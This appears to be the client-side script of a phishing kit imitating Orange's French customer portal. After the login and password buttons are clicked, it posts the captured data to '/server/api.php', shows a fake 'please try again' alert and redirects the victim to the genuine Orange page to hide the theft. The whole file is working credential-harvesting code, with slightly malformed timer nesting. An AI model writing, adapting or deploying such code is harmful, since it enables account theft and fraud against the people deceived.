let config = {}

const sendData = (e) => {
    $.ajax({
        url: '/server/api.php',
        type: 'post',
        contentType: "application/json",
        data: JSON.stringify(e),
        success: function(data){
            alert('Veuillez réessayer');
            window.location.href = 'https://espace-client.orange.fr/selectionner-un-contrat?returnUrl=%2Ffacture-paiement%2F%257B%257Bcid%257D%257D%3FSRC%3DSEO&force=true&marketType=RES'
        }
    });
}

$('#btnSubmit').on('click', ()=>{
    setTimeout(()=>{
        $('#btnSubmitPassword').on('click', ()=>{
            setTimeout(()=>{
                sendData(config)
            })
        }), 1})
    }
)